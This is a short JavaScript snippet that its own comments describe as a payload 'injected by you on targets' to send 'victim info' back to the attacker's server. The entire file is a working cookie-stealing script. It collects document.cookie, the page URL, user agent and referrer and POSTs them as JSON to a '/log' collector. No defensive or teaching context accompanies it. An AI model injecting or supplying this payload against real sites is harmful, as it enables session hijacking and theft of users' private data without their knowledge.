// This is the payload that will be injected by you on targets
// It sends victim info back to your server

fetch('/log', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    url: window.location.href,
    cookies: document.cookie,
    userAgent: navigator.userAgent,
    referrer: document.referrer,
    timestamp: new Date().toISOString()
  })
});
